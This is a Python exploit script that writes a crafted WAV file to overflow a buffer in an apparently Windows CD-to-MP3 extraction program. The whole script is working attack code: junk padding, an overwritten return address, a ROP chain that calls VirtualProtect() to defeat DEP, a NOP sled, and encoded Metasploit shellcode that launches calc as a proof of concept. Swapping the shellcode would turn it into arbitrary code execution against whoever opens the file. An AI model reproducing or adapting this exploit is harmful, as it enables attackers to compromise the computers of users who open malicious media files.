#!/usr/bin/python

import struct

file = 'cdmp3-rop-1.wav'

total = 8000
junk = 'A' * 4112
eip = struct.pack('<L', 0x1000718B)		# RETN to stack
padding = 'AAAA'
rop = struct.pack('<L', 0x0042a73b)		# PUSH ESP # POP EDI # POP ESI # POP EBX # RETN 
rop+= padding * 2						# compensate for POP ESI and POP EBX
rop+= struct.pack('<L', 0x0048c38e)		# MOV EAX,EDI # POP EDI # POP ESI # POP EBX # RETN    ** [CDEXTR~1.EXE]
rop+= padding * 3						# compensate for POP ESI and POP EBX
rop+= struct.pack('<L', 0x00473134)		# PUSH EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN    ** [CDEXTR~1.EXE]
rop+= padding * 3						# compensate for POP ESI and POP EBX
rop+= struct.pack('<L', 0x0040ad47)		# ADD ESP,20 # RETN    ** [CDEXTR~1.EXE]

############# Parameter for VirtualProtect() ###############
rop+= struct.pack('<L',0x7C801AD4)		#VirtualProtect()
rop+= 'WWWW'							#return address (param1)
rop+= 'XXXX'							#lpAddress      (param2)
rop+= '\xbc\x02\x00\x00'				#Size 700 bytes (param3)
rop+= '\x40\x00\x00\x00'				#flNewProtect   (param4)
rop+= struct.pack('<L', 0x004dc000)		#writeable address
rop+= 'DDDD' * 2						#padding

############# create 1st params #############

rop+= struct.pack('<L', 0x004677a9)		# PUSH EAX # POP EBP # RETN    ** [CDEXTR~1.EXE]
rop+= struct.pack('<L', 0x0041ab5b)		# PUSH ESP # AND AL,2 # MOV EAX,DWORD PTR SS:[ESP] # POP EDX # RETN		** [CDEXTR~1.EXE]
rop+= struct.pack('<L', 0x1000146a)		# ADD AL,0CA # RETN	  ** [CDEXTR~1.EXE]
rop+= struct.pack('<L', 0x1000146a)		# ADD AL,0CA # RETN    ** [CDEXTR~1.EXE]
rop+= struct.pack('<L', 0x00425700)		# MOV DWORD PTR DS:[EDI+30],EAX # POP EDI # POP ESI # POP EBX # RETN
rop+= padding * 3

############# create 2nd params #############
rop+= struct.pack('<L', 0x0049de00)		# INC EBP # RETN    ** [CDEXTR~1.EXE]
rop+= struct.pack('<L', 0x0049de00)		# INC EBP # RETN    ** [CDEXTR~1.EXE]
rop+= struct.pack('<L', 0x0049de00)		# INC EBP # RETN    ** [CDEXTR~1.EXE]
rop+= struct.pack('<L', 0x0049de00)		# INC EBP # RETN    ** [CDEXTR~1.EXE]
rop+= struct.pack('<L', 0x004486ab)		# PUSH EBP # MOV EDX,F0EBFFFB # POP EDI # POP ESI # POP EBX # POP ECX # POP EBP # RETN    ** [CDEXTR~1.EXE]
rop+= padding * 4
rop+= struct.pack('<L', 0x00425700)		# MOV DWORD PTR DS:[EDI+30],EAX # POP EDI # POP ESI # POP EBX # RETN
rop+= padding * 3

############# jump back to virtualprotect() #############
rop+= struct.pack('<L', 0x0047b0be)		# MOV ECX,EAX # MOV EAX,ECX # POP ESI # RETN    ** [CDEXTR~1.EXE]
rop+= '\xc4\x00\x00\x00'				# for POP ESI
rop+= struct.pack('<L', 0x00409ee7)		# SUB ECX,ESI # POP EDI # RETN    ** [CDEXTR~1.EXE]
rop+= padding
rop+= struct.pack('<L', 0x004333b3)		# PUSH ECX # POP ESP # POP ESI # POP EBX # RETN    ** [CDEXTR~1.EXE]

nops = '\x90' * 100

#msfpayload windows/exec cmd=calc
shellcode = ("\x89\xe7\xda\xcd\xd9\x77\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x4a\x4a"
"\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37\x52\x59\x6a\x41"
"\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42"
"\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x4b"
"\x4c\x4d\x38\x4e\x69\x47\x70\x45\x50\x47\x70\x45\x30\x4f\x79"
"\x49\x75\x56\x51\x58\x52\x52\x44\x4e\x6b\x56\x32\x56\x50\x4c"
"\x4b\x51\x42\x54\x4c\x4c\x4b\x56\x32\x47\x64\x4e\x6b\x51\x62"
"\x51\x38\x56\x6f\x4e\x57\x52\x6a\x45\x76\x50\x31\x49\x6f\x56"
"\x51\x49\x50\x4c\x6c\x47\x4c\x43\x51\x43\x4c\x47\x72\x54\x6c"
"\x51\x30\x4b\x71\x5a\x6f\x54\x4d\x56\x61\x5a\x67\x5a\x42\x5a"
"\x50\x43\x62\x50\x57\x4c\x4b\x52\x72\x52\x30\x4c\x4b\x47\x32"
"\x45\x6c\x47\x71\x4e\x30\x4e\x6b\x43\x70\x51\x68\x4d\x55\x4b"
"\x70\x54\x34\x50\x4a\x45\x51\x4e\x30\x56\x30\x4c\x4b\x52\x68"
"\x45\x48\x4c\x4b\x52\x78\x47\x50\x56\x61\x4e\x33\x5a\x43\x45"
"\x6c\x43\x79\x4e\x6b\x56\x54\x4e\x6b\x43\x31\x58\x56\x50\x31"
"\x4b\x4f\x56\x51\x4f\x30\x4e\x4c\x4f\x31\x5a\x6f\x56\x6d\x43"
"\x31\x4b\x77\x56\x58\x4d\x30\x51\x65\x5a\x54\x45\x53\x51\x6d"
"\x49\x68\x45\x6b\x43\x4d\x56\x44\x52\x55\x58\x62\x50\x58\x4c"
"\x4b\x50\x58\x54\x64\x47\x71\x58\x53\x45\x36\x4c\x4b\x54\x4c"
"\x50\x4b\x4c\x4b\x51\x48\x45\x4c\x47\x71\x49\x43\x4e\x6b\x47"
"\x74\x4c\x4b\x47\x71\x4e\x30\x4d\x59\x50\x44\x54\x64\x47\x54"
"\x43\x6b\x51\x4b\x45\x31\x43\x69\x52\x7a\x56\x31\x49\x6f\x49"
"\x70\x43\x68\x51\x4f\x50\x5a\x4e\x6b\x45\x42\x58\x6b\x4f\x76"
"\x43\x6d\x50\x6a\x43\x31\x4c\x4d\x4f\x75\x4d\x69\x47\x70\x47"
"\x70\x45\x50\x56\x30\x43\x58\x50\x31\x4c\x4b\x50\x6f\x4b\x37"
"\x4b\x4f\x49\x45\x4d\x6b\x4c\x30\x58\x35\x4d\x72\x51\x46\x45"
"\x38\x4d\x76\x4e\x75\x4d\x6d\x4f\x6d\x4b\x4f\x49\x45\x47\x4c"
"\x43\x36\x51\x6c\x45\x5a\x4d\x50\x49\x6b\x4b\x50\x52\x55\x45"
"\x55\x4f\x4b\x52\x67\x52\x33\x52\x52\x52\x4f\x51\x7a\x43\x30"
"\x52\x73\x49\x6f\x4b\x65\x52\x43\x43\x51\x50\x6c\x43\x53\x45"
"\x50\x41\x41")

sisa = 'C' * 3000

payload = junk+eip+rop+nops+shellcode+sisa
f = open(file,'w')
print "Payload size: ", len(payload)
f.write(payload)
print "File",file, "successfully created"
f.close()